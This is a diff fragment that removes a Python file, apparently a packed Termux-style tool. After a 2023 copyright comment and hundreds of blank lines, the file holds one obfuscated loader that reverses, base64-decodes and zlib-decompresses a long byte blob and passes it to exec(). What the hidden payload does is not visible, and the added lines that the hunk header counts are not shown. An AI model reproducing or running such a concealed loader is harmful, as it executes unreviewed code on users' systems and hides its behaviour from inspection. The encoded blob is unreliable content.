@@ -1,1279 +1,578 @@
-# © 2023 mohammadmahditermux
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'3DLj+8/3vf//ceqr9IenqERnw2g3iA/3ieFqeGyx4gJdgRpNz4CAB4e0PXluppEFMEerRqdQCOwzegAA2iwAim4B+cvZX4h4Jr3o9HKr8VczNpD7gTd4g+xT3pJ+brl7Zh42VuZfB8ycCP8Vayyd2nAP+rOOw0MviEXxPaZrwHUs5KItuRLlh79Q3GwTUBkyFYHX0sqX6SpDASX/TH04rFQjPp+1H5p2plIhWwtQNRdbQumkj7NDcdIk1jqDXZMk/Bjb3xYFrlGlYQsIqMirIDp3apDG7/mQDnrLjwemtAKMMww0OgeKsXmFn5y4fornJc/GBExFgWbKwRIGZPZmg/yHwfLN2P9uIUeUpYeFp7rllv5vx5ynsqTdhRdZgLhmMMOHIZ7klLNNrX9O2pBX9Uz3YFqnqNBGDTXglnXYPkQssBDJ9bMPm/ckfpR1EQfaXjZuvMrzC9AwbzZkfIEQuY84FvVv/slVuAqat31wFK4gNtmWpDLDtP2dh9Go8tlBZ3B1IZkJ9Yq8L1EnXzd1TZvslbESC0Q1r1tq+TG/tF2KXX+D9qjfi3sqD23NbZGXura/jp51rOO5ihRNLaszU7x/qM4cdYNd+c8X2yB9IEpZMzhB8DCcc6eGbkoWLXSeU6xmW/SEX3KI/5tXa6glqSUYa02tBScElvNCi1Ix3ro3RM+58Du/Z8nzeYnsQqpuD2D6JaYK6/mjj5Dz8keEht/rafF3lcjItK/yVY2Aaq5BDzMZx+89/3EeccgSneDMML9EP5nsu95+C553Dmqctze5dUx8td/G6fjrX7T37wQXu0yJfOSXzBlkZSqPkaVEOBpccs26an+lcHCLIvDuClw/0K3N1rKqXUkKfCU+Cj+yarFkzjdSpAlhrHfAG7uDNMBpTpSxuCFvfAk8Wr/EuD5Mi/b98F8tcFpZ0S67tQV4457s5ZDY7RJaLxP1+5NBt2AiaEbrMTcKOFVktQEXGdTA+1YcJmhIWwNoLxavm8FZj0TqSQSP/oxYxgxDWgeC18YGI0MyeD3RiXqlf8lrYgsvVdOB8la1SaheHgWdfJ3HxZEkbYPUTqEd+/qCWYscPrXFmH3QL3VRCE1k3qrdS+rYBcZKF1rEMHmoaSpwBlmeDVuecTzEDniEQE0D8MVJYyf7Uw2Ub8Qowwt09Axt/GbTSwKA+WZVwFbMhRD6VQCWpteSbIFnFgU0rzCf2ggpWs0I4g1XgA2iJ715AZJE+980NCECPKc9Z0nt96dmTgOi9vyeqeL4zrSnt2fl4rlDNIb40/GG6rNBtsxPjkC2xVetM+o6F6VjEJZOEegjcHLJznwkSRZNbI/ZxwRdecBH4Kaz+J9wqUO/rMq0s2+nEz+AkYwnu+QNqhqnpd8C2lCJeV3PFuec/9AsmrBVMxgsiTDaGT8b9wrX/e+gagiCh2jPtrZPAuJE7VhmpTwmf1HxO9r0v85rxkKrU3PeXoiFvE2uh8ksavQ+i035QQVE99aA0k/cL+tfYos633iP7EzkctDqkVACIYpVKvqS2BGErOOGmztocaRhHP4kw89bAJdXVv7pilHxbQw7xKlqGw+eL11aHHklBln90QSRJIJEy3skYJHuOTrwU2/tWYKC1o6++yz6L70750nlHK7JBRS9ziqRy3PjwRKbGLpkmCLiRmNIG8KCnZuXz9sKbMvLea22T9UDVmhce+5Pq+DOgZexsQyYFUNeFtS6eaUpkeTtqLlfIkdBUCcQF/qfc8iosF/QAGFNJV/k67MjjBmxhw8x51e36oeWfMDkWcKi2ANDpdsIJ6QY04XLjuEPaHWkqVHhUwAZ6kYARb4VEQaHsdCVH5kLkezLOMEHdenA6NUa1bIzWPdwNdY+sBXB79q27geHTi4ZSf7pGWwUbAMRndm6vZCUqsNSnFZTsBUIH4YPCkXCIr2UiUKO2q20y4CySqXPDLcr2ptTQzMBkArDDOqqcRsH+Vdqg2yN9bXrRzyRvZKkN4uX6gP8wJKj+opwvlzBoeO2vMBl0o2XqwNxHe4Y9qNpys2fd1sdenjx8RpFQlx9Dfa1J5N3nNwvruprHtU8wbyiGDIFWPvwbFzw6kQZziWeyq/1NJcqY+lokDmZWvuCebgQATpk8+MUNRqcE+EOIryy1Iew19wVn+S4LUCBJutjxhNwrN2t7szLmK+IPstA2oEJ2DME7eunRkGxVnDaR5neek5cCrSqVU/Pw3pmsSHUDaOkw/wsH2eQmeCOkV81+ovTDJ0MiZDi01nUwtAAHE823Y5Rsj/bnVMdwSFfrk36zBTB5X+kT+MaBWP7csTE6AGWs7ep+i7D0HZX2Z+BJeArEF8oBMNM91uSPFqhh8x9eTDIxiCr2XgluEEYZH4rk2md0FwoMqVgoAscd1oy2X+aZXzqasZkcBee3sMNXDbTndUzPKSmHP3tV4zlqu9HlP1hiwOYaSn0Jj3rJtvGEzWrAU8AV3WzP9LxlIP+n9hAAS9daYktBUmhu4uU1yMz5e8hL7wTeKhilwCy09wskq9W5LOWtY/tH/pdsWjjf6o8WJz//e4vjVZOnUZvJav+9E2ZvT0c445NNpt46aGPFbgP/WF3UBvzgX5Ga1eoYJ5dKMdJAKkv/kGF3Th0DFLuiGZJayJuKl7HcO9lKb3r47xcgj1yNRk+WUpLXL+NC6uE9tkRYxrkn0YUQ3T39IlOPxAJwEdlMZU9w1oZNiJV0Tf1+PS2NH++C+65z+zblKIx0DGMlGXNaJLTfLifbgbVJr6z197MWf5zvGetSBqGPxwG445037i2mTsSTm+QoFuryJfJvAr6nSahhGeJtKIsNHN8P2gXKkRHTjOTlc1mqrTuaUOa0g03n2H8OyQyYPh2zRzfA2D2IVP//WkM4fNHYGgbwQzq0bCzAkj64zkpSOhLWAlo+374auMZSWBXkoJYETAs6Ip91Gu3SsVaTPYBXMxxDvVvQqm8bAJ6HyLAhIY9vXEpjGPYlRwHCb/GAqdZcvQeF2vqwCgHd7JZAapfOVf1GeJxx1j2+0UvNVT/HbG1REVoC7H+IaHUkaI9EaDFQdfo86vyK++FYyAIHw+psXu9B0sS9gJatX53RM+rb3wIoiw1sOI7RR2/MjtGqwYXtviT5wdqcYLOiWeyTe80moVnbXrUjLDrE/WwrsLXcPQGpLYZyHKo31uBYs5XLEeJ/QRkg2JCyQ8plrn/INyiW6glFrqkMSTOJT5k2ngQzHAEMiO561jBpnTZwvc3jaupXS2M+vVF9/8udZE55K0HdfWDsUgBsRfMMh5SNO1Igga3d3ZBowt0gXpXYyReECO05MUEY+W4q2z5UiPTXiQVWVXV28+prvC3rausMwN3axLDoL8+VwS/Sk4hXWHOz1y9OfM8VI2v8cBc82JLkRPy/mDO1C+s8C7shMCT1aJz2kr7HF/MpRRndKrJWiqMmPUmJfJWAvs9FduKvAr3ke4i0kSczBYKhROqiFBQ20pV/XkJXuV1TAyfI1a0zBXMtEeRl2Me+8866ElHNnv/OmNXtB4LHaAMUoCoDDiSWvFR8eaZ+UmD48VBW00fiFD9GzaKks6bIRf+JK2J7hx80XST5nJSMwEHsxHr6NTc5Ih0mjjhQQC5ylZC7o/mTi9xXRKiIpTyeYIIF04DEcOXk74zC5ERDEUJAyl2rl5kWhQeQANYCUDGyEup+2MlqWR2DVoPi8wQ11qrbchC+eFxB4FeeqdkJddkJJ03Oz2IU/A3MRb4bQzbnzaWIVlGrEudTIrdWZ2yxwSE1HJ9087K9n9uzTSnRvmmrW3XLM5iPOjJYmbzOt2hl1jZMl3PKHCMwM3W2ZfCcvPsSMJseSN4oC4JPZe5UzWhFJlJSTy0mY4iBCpz9do3Acy8WNeBsRcSP6CSxVHfRdTzuHTXERuXkmPF/rCPxs70KRW7Y9LIZtPVuqQPPa0tqtjFE+1ek8wpkj5tKlFRYSzn1C1/ZTH5yph9tehlcCRrtzOIiJ5wgq64CCtjr+BcMh5o7tZC2TZDAhSeXfl+2Xx5XNSX8zwaZp7MB7wltMF3e0CWCk0JWBuSr//DvoKfXuADiQ/GAH+ghBpFVUNRS3+MBV2mKK8Vx+qlnM26ZFzZEBnBcDuAMAvxvHFYyQBmTu8/ggc5uEGE65zwj3164G7fHXh5C6cv6zdO4y1fFHbN/uUeW8AABjTSbi7vQS6i8o42GzWPOtSYHKWBPSWdWvYRMigNx3kCcwpxoP0vWKPG7SueQ0g+1huP6pcARa5BhzfsIMpcK1ONgWOAKsI+KBiY2wvA3nHqMl5IvKupLc7bId3v72+dNXXDM0okGynJFgjRizM2YXHKifEdI2Mdua4JAmck/RIfP3z3do1AQdku5gibMlCdEuGmh7f2sfWlKN/7sDnjo1Vyiq/e5NDGwoCxqjPBf3Ou9zQKUp1996bDB8zz0z2550jDnlTH08RIlqLvhHNQasJdReeB/xfKRkPGHw2f64V47BnSlpxDx5VPi8CNvhSS5DtyH/caBfgGvVzMaVamKnsJCDXITZI8M1s/ieVPD/hNJDpgDd0WnG/LLVgU/ldbXXA+mvoQsLV+rV8iEitiPwzumXQd1seQGFlxCReDn/R1T/6K1DbKe7GxcSbubFwQcdincFQ4+X3JDAulLgKpRlhla4u1tKFKofN/ooueoSCUxlX3z4A0OjFPPJAaD/XI/8lnPIoedBVO8LHwPPML+kRzg1lcZRP5hnU4869Kr2gDureoLxU59GL2yCAXRE7LE0uU/v5do3tfZ2vqcDCBEpqQvCLQ/rA/8y67BzaFfJsfXbIScjbaMoqfWEyX/KCS2su8T4rELsXlRzcuz8P2hySHY0/UfL7sYJGrUOmS7A8G5Ilk3Jy/IN8NWmKMFYWnDVVCG+PsmcBR2dmsy9dkxqGIgdWWRJjyI4W1ntb0sLL1eci7J36mZ4VwfJO3eUhWL5xQXla0+d6C+a3LuvXmBuBvH+8nS3VQYdiaxm4Ru2Tf83hpi62HHmxAfRAmFiedZ4xe4cp7WWJRfQ6YH2L+XbVYK5tmaqPwXhtHOADPEoYUuyTtlgS9d3tIONP+1OVlKLikiFt5GgQtQqDI6yqXhon1nGy0zYSQbs5OVu4l6+d5agbzRee4/SnpvlQU1AsW1zVX19cJOKa0nT7Z1bk3v8Z/vlCeleb6qmttIvmT0qpisjXJq7sjLDLpB7RbluSfHECKs2wCIfnB5sGy14wox3l/V8l0jMAfu/gh+TGgHws6QvANXk6Od39w0IhW3L0m15iQSyR8WlvjDuIJ0tj/8JoMHhwRrf9lcNqZyPnFTGZHEzanQfPMqStlb1yLHX+eElvwttNyBHoSM40EAx6fOVgoBqAiVOwLZwgw9H99absHq8g8e7qWeNTdEO/yVnRMRvhM9t8m1giVyBdf4MPm5XdjWszVRW3xRa/xvh8zF/cy0GG4Cc69QFNwGZIgPttZXE/RgmJwWCdTsHGIpEBRPCcpFdr8qpGe65ns3HhHlq5u1j4n6/3vp/YQQTnk+e5wCNECb1M6v0gKrXD22+h8Z2E0w6QcvKb7GhnkYlj7e2s/YFJM2HzA+gteZ3qrBQyXwzJqhkI/GgMQ4MrFB75VeWJsDebOnmf4HqwDEn29/G9nBAtpcZNAfJInXaIB+95yAhZ5tU9bXrrNsTT0i9eFikZfjHzSX/NeLKT4TvMlgmlcfOZeTFsOBEtuI8JzV7nUfyOE64qDqbJrvSzlPvePe8NOSsy3j3DN403fKNGqwf3/7+mi40o/N3CDDm7py3aLuLF3o7NQheDLzfmF4cAVAZDaBtZ+9qad3pFU4T6zy663Y3OPXfEcJYODdsY4a1u2qBkGjMfzdIoX2twKwgX3Ow/9s4v8WF1WmG80rYU9nO69ngfDm58pT8UUFQpP3gOxwiAHnpcd7ZET64gRfs5Cu1GdCFIX9s33JnhKrrWAg6Gk9vAroy2JwCOaeQycsDJwnURmesf/7uhIrBM75Nj8MEf+oVD6GTh/SzMEyoqPNFD2Cr2adD/AwmNFb7/aumgNJ86xDlt5yHzM1Obn8lzwEWYKPTaQcMQc0XYOSawcIbutyr7Yxz8I/mtoX+g0Ldff6YCEHHfeBnmXq0dEERbS3CV+QZK6RqT/UDKqhvlCLSV/16kOA0aeGAN8snfX4kbPRtSf7rODTWtagQjaPftOfunxnLBImINZuynpQDcVTKxjQRxMCKZmBoh0quStSsm+lh6Qk/1PH59rlqbq28MTADy5RPcInmZx8vXlwITD41m8LHhkg3DuXr7AQ1mhgZ9KoL5nTWaa3s7W1CBHCynu+zVOY75L0TFaPTiowqOjqqnkIA0owEnYWQqmlrMMo6/6KWwb+9pXbyOz8ONYSGbbAnLDk6brs4/LKJivvgzOuWZcnBzcLHPyXZ+27xaKEhi+4KheIv2miqNM2AE32oZaktatm+lp6dhVpvzYiIH5trd5hFpuKYf4yHhd48T1s+VzHDHcvxIKauyw6u+KY9pe4E4v2i5Dkzeq6APzOMmwW6yLoYIlnIopUhDedTQuUvUawY/n9um3PL9SNI//UQOqyD/Z2CsXNWmnqLmF79LGpHE/k9d7vSy+RU+/tVQJ+ae2yPWfECa2/PrKd8fj1tC4Pix+0Zmr83kwsqvRlPYeuVvolV37E4EQJXSb8rDnoEk+PbpqDy5R3dPHR2q0+V5edwqPI0+V7TcFSNizH3gNwujEBR4sVdnm+u5qCB2GOVCr0H89VZewdjoXdFAdNrejpKxRfzWDbOB+jFTnOveLRD5LOUnTYzdb0188jtCx+K62i5EVW5xhOsZRKCXBeUp+tKDW6JjSuAoU2Tqqnkz0o4VcdNcwj3kdGYQi3O6I8TlzIAuOWoBFWPf29SfKqCI2Eb3WOt1vG4UBKbg/Pff94neyyz8uljONIuEGjNY/rxDphu9zHOrKESDOK1NUPAt38d+Qt5192rBhZDgNgjojdKfD9nwzpuoF2GgcC4rJFBYEIyb3Oo+b/Eggc2o0HWd028U5/257VMH5pOJd4iQ+T/Gv/dX6qLTwkSnA2TnmFupefsI6FUfvo65RD3la+9yi8GY6ddKACW7J2vnaB/FnxXXPiV+hTGpoZdct6zAqxW/VzOYT4CbCWUDG4zAxybkf2b16/4nDj/GHqYM+/Xs2NzgK8VN0CocPQ6Dpx9cwdzOrmQmTuMIBLo9zIzRIZyh+C9dvL+WfvTsZ7YuR4OVJzLJ45ckdwOAo7Cu6+09h9jywn3s4gotMWrhtX7BL1MywQwjAnH/gig8InVcSiVzw7RXIIJDICDrfIO+w6/eAGnRx+RRKKl2FgVpy3GEqcR3Jti3TsfsChCwpA9wtmtxbTOsmLHgGciwwIAKoxVS+AxnM0ar70mOz7lGnn1Dt7XzUxmUlNoNWL5T18CrBLPfv+O/6gnd6hK2vAhtYF2kWUhIhwEpaFWbQfPHYSTbxa7LLY/jFLktaLCXdpZH6pVddPMuAXdzPSKCPcnndGF0FX6ygpmy8TIv5IpPLUmv0hXrtALYACiUydvsM/qfg7ejJo3bGTipI7z8fUe+QlKOo5UOBp2vFrhLKmBDMAZ0GlHKpkE822LDTWMlDXPuf3wBypUPqqoL6IUx/hvv0UW+5uigDHU7dWA6dcKSpnLat4BnqdO7YfNAQMXdeKaxb+hjdWxsI334TBDsxboviCsXRwBsuctjsenY5+z13xSN8fyw6RaaQgobu2041buhXhUsnGLUqvClwZAOqSX/TYrThAR6HQksbdSWF+BKaNGMbhxpEbAKlkoKHrLKzmMUXrcH9eK3wj4L5wUkX777KxpSCLbjIT78WlA07Ykak2L0XohAsuGwyDIJEwxWrkCCNqMh3daU9wOxNnv29jegi8Cj/3f4PteDAsUF5nObbm7Tx92rtMkzyJxk8Y9u5vbBTdHX96ZN0zisa6SiDrRblg+Ufi2vozdGb1ygLZnLTufpWbIXvz88wTzQXYI9ofXr+1qm/QNsDBfv+gT9r1r/yQHhEHd//YktP4THmUtn3fwgHanJHH2QrwsCvM5m7qug9Y+Jwn8jC2QhAZmb6lKLGIl7I7SJyyFqYhRWdSvhtXZWC7EnAoQo4ZXSkdk+iM3E59znqEgJMul+ycH0I9H9hvC1GNDbF/3OQ2WTsMw1cTbOJR7LbQJ15r2/j4jk/q6K3n5sn3RDc6GyX0c1V2E/Ndc9TiySkgaiVm1qX0ZgFK9PfhEg2qkbMF26V/MYmDhLAWTRGbWLGFupiFqF6iBhCDw12jhfCgROvQP1Nbb1ShyOazti93Y5VDBx4INBOa99tw3atRYmQ/BQzcLGh+amtgkAXcCEmwQ4RW2blKubhlsnGcnH/Pexf2qleMHnEql+oNrHrmo+U3jvH00XtfEdgWGJU/K8bpKbYxpTn2zuwl/cG1ZWgAJ0LC3TjNKuzk0KB+jVHdg0Ax++BomF7P8FfvmpTCKE/83vxwQgYlMIuGrBTsUHdVQqKwhjqO8N6VnbOfskUm//eNISVT/mPHPYCwiFjFpBXnkd8ew3bPlkjKDpkJy2gpO1afYdZZSVMns3USHE1sdCZcD69lP3UHEEzN7fwyVfSivlTfadN+tguUzixM+CM553BHZPQLk+48Evp3lMxSgh3x/ehjXkYCBE3ZF0ogJRp9SoaaLannFqjvL8Tt/8aWmy7harrFS1K6GpOOdOWQCQStj6YwC8osU4PGaSAgQxV/EAlNhwt1HgppVdTI97k+v8QwQcAntCC1rVzSXR/k0PEENUC3caPe9WGCw07cfRV5J/Pou7jUkLAvGtkbK62j+IIg2YMujwb63bSqQb4QfOQn4lCJWUdob1IN40j3xdtlQypmP1tt+MR3QJPmPg5dunLoNeIPtF9NY2BV3gNcBKB9Awonimm0CLp4Qw/mNHTRadRjk0tQwgClHTWHj8t4DZQuxbRBCkV3ahd9gMi8vVjg20b96VUDUEcQCgJO/Lq7nUsbcpcjA4poFA8RJtjQ72UcqngipuLoVw5zs1+ly4VcGhnPVKCDwp9r/+9LwsaP1OHtFSItHv3aZC4WJqPopPdLjdKzsiDgchwIS5SH3HAGWw+7Gzc6441rBfcpPzW8Icr6NPisJOJZMUm0pvZGMbd0MXIAvnlEai2emEk60CMVIISutc/OCfM+hidMtN9dD5+9mpmI++LpF1pSaZzWl0LXmA4p4EbmpDza7jrLP5OSMyT3vmFRWMlSc2FCYKt7+jiChrMZZqqWzDJ+/FWg9Gq1RhN/48qg89HPKKuMAbFXbE+KQ1TXOyrdy0rNzzmbJiDe6egHzuALYK4nhbvVOACLhAXmCQI+iGkECvf34m/F2HYMJNhtqc9m/9KjZKqI0nnRbUqfDw06Vcu6tO59SLdNE0z9QiXh2bVBYudFWR6itpxI1alDxxn3CioBZM2Ww97hyDtUwKeKqWW9XUISLH3V3dtKWt7qG8Tmpy83uof07WQwp+AYuMCTvIqvM7cNOK7O2mDgweDAlRrlcVOK64elmW08nEcody0ii8uiQTDE9Pqvrgqkfw72OX/r2wiyXhIkII7Tpdu/nwnt/zDJDTz143CAnZd0ggDYGNyCSIupHnWsq+Blnx037SHtHRmpeDd7iFthhu8xh52yNPDZooAFz4u4da7qFRp96y+eA9Kr00vRIs1wn3pXajpS/b3Gf2UhLlKg9BY4O81zc+AK95vrtYelw7ZFFqeTIsCB7bzHWa3rGXwXmOWlMDFJbz21s8COGVVYZolF6JfCQKkdZx6t102HQP1V8ucdSXJSnlIhaiArSA07O9L2bIPjZ49GKWWWsirAJ6xxONGeceutK8AAY0QY7EHw2Lf2/SYu9tJcYaBJk9nDvRCxoWddJ7TcoQ1PRHVgVFV1l5j1ng3F04H+WASNfcqqBrGaqp4ldIBFR34luEUf3Dtyu9zp1vMJy5NDLIKPYZfCBdzvAqCIhEiI3Q07CEgWLQDxI1lxPJ2A6M6d+9fG5L3+HlwwrLWrKGaIbgq6qKrnl2aicv1ZuSWRWZrwsL9At9x17CFxrSbjMByiFelDGGlOx2EACYqhLxkoR6AC3nZQUcRKobsS+64NAGEYscZrlC/5JR4F0x6tnOFIMbguuilb8Rn2pv9MwU9KkXiDQR7v9ZJXcUcipURI4jWZdBZ2mOcp29JU4dhObe2u3M8q9K60KHxZ8gFOHwLBR3ro/IGLIVVeZLhYxv/F7LR0iNbglOwA9i5g6HpZ0yJlphwY22BrOp/xPGbh6A/yxLlCBX3NPzPKszL/omgHGThkg+/gyHrvhMlprKc8YaOPZdhTS4bOWcq/CUmFhb9qGo7joZJ6tcg8SY4mBs7Nca7z3tsb2btBbZp+x8baYsVU/SuO9ywSDMWaZwusF+5cptx3FzYzDbb9wL96hP/Ks8im53PzUFhV3fWfHvbA8MEYCq3jDQ6dcbl7Rk2xg5ejfdudjoIFtTV/j0ty7fK46eY9oktaPcZDJyuq7Eng12GqvBUkf53t+7y1UrZ4aSiaGKwm7BRrFIRgxuKPEh1ht8YodvJb207WlBoGUmB6QhAmzDtIBF0/eITB7cGj/3bS0Wfgidhag+gj2/WU9JhqwmXo66MfOATU5fyAKx7y80SVnU/aaHGX9vcc/3A2WoUe07kIoAC+G9nMBwcSVf5FzjB7qyg2RZ9HzyBGzNozCkneFZ058c3eb0NMt1nd73I5zSrpc9AjA2/JLCpc/Pb0GmdjelsjuAC+QQQ7Wefv889BhfEa8EGTedGBKAOHrnwlvJs8WKNilB9/ZVje2diRhqaPrX4uVlhaHMxejHqVayb2N+1rb3GTVO1+2ZzAiqyp4GDN3xUzrdqI94A79hP5NrSgAkK0EA4FnL14xt9FPbwlkr9QtUD38hDvITihQSu0U27/gB1TOkEAAH6s/d40TqTHIlEsbwiIoRbUvl+NcKGKesRcknrjxvbary2LAlvgX4D1TCy+xJwSsxF/rLWeIbvNdLSMjQpsazhcWi7N/l1CujYvJILtsbsxX5OGe7aks20U1sEr8OKTSvn/JOHw3KJE8owESeSo6PsEUyw3VR41ptYncgFVisRe6LvCz+b+QWW9X0V1junNoLFL9AEo3UXTiT8+3AwYUH1NiKSmBWbIspWqDV8qe/65yByJGXo2d6jgsv/3sxKK0wzqgdWnViNrj7eJWTlHvFJIuMApnmVRydRc1zrXn70SdMbeV6YyJdZs1wu0eSb9oVv9J2xjuINbtX2/2ULdpCBluvKwf+IZNeMPJcXQ9p5CQ4rLVw6eBHFd7Pr8V3SmD3jAZe0b7CcOc5zQa3Ae4LQBiBMvjwJ07uU5leW9f87Hf7kiV/DYX/bMc6n7JBiW7SkwbcDqDMpOmCjWc1BTs3CKQ6JOs0bD0Zg0eW93HL7J3LvdT/oVVUo/MOQ0lU6zK07QZwrCxxLHyLatb7cvQc0cmrMdPFKWwDGAHvXVVE6FBVDTXehmubWq1O03jRygveR2kA4yYtBS0AZYM6XcCy/LTzsV3vhKDovb7PeooPiRZJVS+zaWW1E/49a4mn9h6dPJZI4fZKFocc1Zs4h5LRkVV4zGkS0ihm0Z9CdtBSL1aegb1VEZ9jaBCB/VcNkR/LAfA3dtTPKnTOsuch1ilJ/eyDmdjtvE2oItNNzSZIx6+mgqOFcqXrr8pAgD5sC2/9z7pwNJDTRJgyBkHUfnEQfSbAgVy1pm4EkVx3+acZu+JeHWKp2jQlNTjsd4CnYRJjE6yCCH4Oy/w8UQ1cY41OReHTmaYz+jdso0LetfjUqEYMfFg2qFyPjm973ZjXVvrSc3sMF2O/+PocOoDqwD5EoTpk1ZEru1KQudgKaFzrTp5VL2c2a6UWaMg300+mhlMqn6IpxfIJKVq8Aae+SKyk28nv6t3tYZRZgUHyj4d2fN35H8X9AYF6dou3/is9aA6QFc23YWr9/590IJmV+mnxLBGQUMdjBAnTQOrkmnK0OvkJkcibiCjz9d1Lsytx7QEYMt775GwWnzUbu8KlS+QjeupTdBeQxilMmQ/JeX+eJ1Fc9Xrk7wgjT8Cw2Z87GT++5vTkWKc0hGa1aGgYWMyKgrdh6NGgmTMW2xCFYJRowuMomz9IzRuTfbAcVBOSUPl5NSbbNsYHXvq46M7//GRpkWzgnAAdCEc3lD1UQ9HddvU2RkoQ0XKi4N9ABotnofEx3Q6xH4HqFfD5mSXvn1AuR73/pE7DormVDoOcNB3nlSAGGPTfBGHwzViGl/t67esB5SmSsWYDnhGh2w2cGh6LBPWYvgYsKY1TBnW0ouDocztmu3ZnC6W7VUucYYlc093qh7hvunMv0Zx/RvP0QB1CxMsrPUTmnI3CcW2PadDs5OBjptBkNtxhLxrTbUZF84f/kaOpY5Ndu7DI1EUNbL1/HwML8/MBY9T/J5fLAd/l/6pGo4iDJNxvAIdSFLsVdgAamuAUjxWPiOWrhuJaKEWj6lUrsu08+VVLeV4pGeBlZp+jdZoxZQEmt1daP1AyuK44J8NDPk/EqtuIb97qNhd41T6C5MOD9vpZ+7M3lTjKN2t+zt+1Q7P3gVWOCCxQ8Nz9Pk8+TV955ws4Yrhc6/zRdjvBZpe7DfUKdQE2PPzIbm12kt6U6K/JTxg7cpJ+ylhLavNQWHFmf77sFwZrYEanF8BgYIfU2OlQHF70yQnheG3JDu40+ZCz0C577j74jypzR0ms55Il3i9fTh+5ZXo2ubSTpid0mvoiffyIAuRR2rY+/VtaEQ66dq+R347bKFjFBYW5NO53J3e4bcUkPB034jW74m0WSP4vde55yRP9+gHV0bW2Sf39gdoTDfNYShOdwDakw33k5FSUmALevOJP1YDScDaOHu9c8S4G74dmC/Zz3eg01QLv8jf0soxU0gNaREYHH3unVjQ6EtfD51cxsv1lU0pB5yFF+jj843nniF+YbRcQpEM1fV8yWqXtoct6gJ4E0QU16W78mjG5Cf39Ssrxzm9D2GHzKauGCLVeve0hnNF4+cX